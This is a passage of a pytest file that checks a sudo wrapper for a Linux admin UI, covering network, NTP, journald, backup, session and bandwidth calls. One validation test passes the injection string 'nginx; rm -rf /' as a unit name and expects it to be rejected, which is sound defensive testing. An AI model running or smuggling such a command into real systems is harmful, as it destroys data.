    def test_get_network_interfaces_detail(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_interfaces_detail()
        assert "interfaces-detail" in mock_run.call_args[0][0]

    def test_get_network_dns_config(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_dns_config()
        assert "dns-config" in mock_run.call_args[0][0]

    def test_get_network_active_connections_returns(self, tmp_path):
        """get_network_active_connections が None を返す（メソッドボディなし）"""
        wrapper = self._make_wrapper(tmp_path)
        result = wrapper.get_network_active_connections()
        assert result is None


# ===========================================================================
# TestNTPMethods: NTP/時刻メソッドのテスト
# ===========================================================================


class TestNTPMethods:
    """NTP / Time メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-time.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"servers": []})
        return m

    def test_get_ntp_servers(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_ntp_servers()
        assert "ntp-servers" in mock_run.call_args[0][0]

    def test_get_time_sync_status(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_time_sync_status()
        assert "sync-status" in mock_run.call_args[0][0]

    def test_get_available_timezones(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_available_timezones()
        assert "timezones" in mock_run.call_args[0][0]


# ===========================================================================
# TestJournalMethods: Journaldメソッドのテスト
# ===========================================================================


class TestJournalMethods:
    """Journal (systemd) メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_run(self):
        m = MagicMock()
        m.stdout = "journal output"
        m.stderr = ""
        m.returncode = 0
        return m

    def test_get_journal_list(self, tmp_path):
        """get_journal_list が list サブコマンドと行数で subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_list(100)
        args = mock_run.call_args[0][0]
        assert "adminui-journal.sh" in " ".join(args)
        assert "list" in args
        assert "100" in args
        assert result["returncode"] == 0

    def test_get_journal_list_invalid_lines_low(self, tmp_path):
        """get_journal_list が lines < 1 で ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="lines must be between"):
            wrapper.get_journal_list(0)

    def test_get_journal_list_invalid_lines_high(self, tmp_path):
        """get_journal_list が lines > 1000 で ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="lines must be between"):
            wrapper.get_journal_list(1001)

    def test_get_journal_units(self, tmp_path):
        """get_journal_units が units サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_units()
        assert "units" in mock_run.call_args[0][0]

    def test_get_journal_unit_logs_valid(self, tmp_path):
        """get_journal_unit_logs が正常なユニット名で subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_unit_logs("nginx.service")
        args = mock_run.call_args[0][0]
        assert "unit-logs" in args
        assert "nginx.service" in args

    def test_get_journal_unit_logs_invalid(self, tmp_path):
        """get_journal_unit_logs が不正なユニット名で ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid unit name"):
            wrapper.get_journal_unit_logs("nginx; rm -rf /")

    def test_get_journal_boot_logs(self, tmp_path):
        """get_journal_boot_logs が boot-logs サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_boot_logs()
        assert "boot-logs" in mock_run.call_args[0][0]

    def test_get_journal_kernel_logs(self, tmp_path):
        """get_journal_kernel_logs が kernel-logs サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_kernel_logs()
        assert "kernel-logs" in mock_run.call_args[0][0]

    def test_get_journal_priority_logs_valid(self, tmp_path):
        """get_journal_priority_logs が正常な優先度で subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_journal_priority_logs("err")
        args = mock_run.call_args[0][0]
        assert "priority-logs" in args
        assert "err" in args

    def test_get_journal_priority_logs_invalid(self, tmp_path):
        """get_journal_priority_logs が不正な優先度で ValueError を送出する"""
        wrapper = self._make_wrapper(tmp_path)
        with pytest.raises(ValueError, match="Invalid priority"):
            wrapper.get_journal_priority_logs("invalid-level")

    def test_get_journal_priority_logs_all_valid_priorities(self, tmp_path):
        """get_journal_priority_logs が全ての有効な優先度を受け入れる"""
        wrapper = self._make_wrapper(tmp_path)
        valid_priorities = ["emerg", "alert", "crit", "err", "warning", "notice", "info", "debug"]
        for priority in valid_priorities:
            with patch("subprocess.run", return_value=self._mock_run()):
                result = wrapper.get_journal_priority_logs(priority)
            assert result["returncode"] == 0


# ===========================================================================
# TestBackupMethods: バックアップメソッドのテスト
# ===========================================================================


class TestBackupMethods:
    """Backup メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_run(self):
        m = MagicMock()
        m.stdout = "backup output"
        m.stderr = ""
        m.returncode = 0
        return m

    def test_get_backup_list(self, tmp_path):
        """get_backup_list が list サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_backup_list()
        args = mock_run.call_args[0][0]
        assert "adminui-backup.sh" in " ".join(args)
        assert "list" in args
        assert result["returncode"] == 0

    def test_get_backup_status(self, tmp_path):
        """get_backup_status が status サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_backup_status()
        assert "status" in mock_run.call_args[0][0]

    def test_get_backup_disk_usage(self, tmp_path):
        """get_backup_disk_usage が disk-usage サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_backup_disk_usage()
        assert "disk-usage" in mock_run.call_args[0][0]

    def test_get_backup_recent_logs(self, tmp_path):
        """get_backup_recent_logs が recent-logs サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_backup_recent_logs()
        assert "recent-logs" in mock_run.call_args[0][0]


# ===========================================================================
# TestSessionsMethods: ユーザーセッションメソッドのテスト
# ===========================================================================


class TestSessionsMethods:
    """User Sessions メソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_run(self):
        m = MagicMock()
        m.stdout = "session output"
        m.stderr = ""
        m.returncode = 0
        return m

    def test_get_active_sessions(self, tmp_path):
        """get_active_sessions が active サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_active_sessions()
        args = mock_run.call_args[0][0]
        assert "adminui-sessions.sh" in " ".join(args)
        assert "active" in args
        assert result["returncode"] == 0

    def test_get_session_history(self, tmp_path):
        """get_session_history が history サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_session_history()
        assert "history" in mock_run.call_args[0][0]

    def test_get_failed_sessions(self, tmp_path):
        """get_failed_sessions が failed サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_failed_sessions()
        assert "failed" in mock_run.call_args[0][0]

    def test_get_wtmp_summary(self, tmp_path):
        """get_wtmp_summary が wtmp-summary サブコマンドで subprocess.run を呼ぶ"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_run()) as mock_run:
            result = wrapper.get_wtmp_summary()
        assert "wtmp-summary" in mock_run.call_args[0][0]


# ===========================================================================
# TestNetworkCoreMethodsMissing: ネットワーク基本メソッド（未カバー分）のテスト
# ===========================================================================


class TestNetworkCoreMethodsMissing:
    """Network インターフェース/統計/接続/ルートメソッドのテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-network.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": []})
        return m

    def test_get_network_interfaces(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_interfaces()
        assert "interfaces" in mock_run.call_args[0][0]

    def test_get_network_stats(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_stats()
        assert "stats" in mock_run.call_args[0][0]

    def test_get_network_connections(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_connections()
        assert "connections" in mock_run.call_args[0][0]

    def test_get_network_routes(self, tmp_path):
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_network_routes()
        assert "routes" in mock_run.call_args[0][0]


# ===========================================================================
# TestBandwidthExtendedMethods: 帯域幅拡張メソッドのテスト
# ===========================================================================


class TestBandwidthExtendedMethods:
    """Bandwidth 拡張メソッド（list / summary / daily / hourly / live / top）のテスト"""

    def _make_wrapper(self, tmp_path):
        (tmp_path / "adminui-status.sh").touch()
        (tmp_path / "adminui-bandwidth.sh").touch()
        return SudoWrapper(wrapper_dir=str(tmp_path))

    def _mock_result(self):
        m = MagicMock()
        m.stdout = json.dumps({"data": {}})
        return m

    def test_get_bandwidth_interfaces(self, tmp_path):
        """get_bandwidth_interfaces が list コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_interfaces()
        assert "list" in mock_run.call_args[0][0]

    def test_get_bandwidth_top(self, tmp_path):
        """get_bandwidth_top が top コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_top()
        assert "top" in mock_run.call_args[0][0]

    def test_get_bandwidth_summary_no_iface(self, tmp_path):
        """get_bandwidth_summary がインターフェースなしで summary コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_summary()
        assert "summary" in mock_run.call_args[0][0]

    def test_get_bandwidth_summary_with_iface(self, tmp_path):
        """get_bandwidth_summary がインターフェース名付きで summary コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_summary("eth0")
        args = mock_run.call_args[0][0]
        assert "summary" in args
        assert "eth0" in args

    def test_get_bandwidth_daily_no_iface(self, tmp_path):
        """get_bandwidth_daily がインターフェースなしで daily コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_daily()
        assert "daily" in mock_run.call_args[0][0]

    def test_get_bandwidth_daily_with_iface(self, tmp_path):
        """get_bandwidth_daily がインターフェース名付きで daily コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_daily("eth0")
        args = mock_run.call_args[0][0]
        assert "daily" in args
        assert "eth0" in args

    def test_get_bandwidth_hourly_no_iface(self, tmp_path):
        """get_bandwidth_hourly がインターフェースなしで hourly コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_hourly()
        assert "hourly" in mock_run.call_args[0][0]

    def test_get_bandwidth_hourly_with_iface(self, tmp_path):
        """get_bandwidth_hourly がインターフェース名付きで hourly コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_hourly("eth0")
        args = mock_run.call_args[0][0]
        assert "hourly" in args
        assert "eth0" in args

    def test_get_bandwidth_live_no_iface(self, tmp_path):
        """get_bandwidth_live がインターフェースなしで live コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_live()
        assert "live" in mock_run.call_args[0][0]

    def test_get_bandwidth_live_with_iface(self, tmp_path):
        """get_bandwidth_live がインターフェース名付きで live コマンドを渡す"""
        wrapper = self._make_wrapper(tmp_path)
        with patch("subprocess.run", return_value=self._mock_result()) as mock_run:
            wrapper.get_bandwidth_live("eth0")
        args = mock_run.call_args[0][0]
        assert "live" in args
        assert "eth0" in args
